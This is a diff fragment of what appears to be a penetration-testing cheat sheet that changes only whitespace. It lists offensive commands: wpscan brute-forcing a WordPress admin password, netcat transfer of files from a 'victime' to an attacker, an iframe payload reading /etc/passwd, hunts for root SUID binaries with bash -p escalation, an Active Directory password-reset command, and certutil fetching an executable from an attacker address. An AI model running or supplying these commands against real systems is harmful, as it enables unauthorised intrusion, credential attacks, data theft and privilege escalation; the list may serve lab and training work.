@@ -37,11 +37,9 @@ _______________________________ /\
 [+] => SPAWN SHELL USING BASH   - bash -i
 [+] => WORDPRESS TOOL           - wpscan => ex (brute force mdp) wpscan --url 10.10.180.74/blog -U admin -P /usr/share/wordlists/rockyou.txt
 [+] => TRANSFER FILE VIA NETCAT - [victime] nc -nv <ip> 1337 < <file_to_transfer> | [attacker] nc -lnvp 1337 > <file_to_transfer>
-
 ```
 -------------------------------------------------------------------------------------------------------------------------------------------+
 ```
-
 [CMD](JS)        => <iframe src=file:///etc/passwd></iframe>
 [CMD](misconfig) => bash -p
 [CMD](BINARIES)  => find / -user root -perm -4000 -exec ls -ldb {} \;
@@ -63,11 +61,7 @@ _______________________________ /\
 [CMD](AD)*PS*    => Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose
 
 [CMD](WIN)*CMD*  => certutil.exe -urlcache -f http://<ip>:<port>/file.exe new_file.exe
-
-
 ```
 -------------------------------------------------------------------------------------------------------------------------------------------+
 <br>
 [?] Using "-p" on an SUID file will run it with the permission of the owner. Ex if root own a file and you run it (non-root) using "-p" you will run it with root perm
-<br>
-
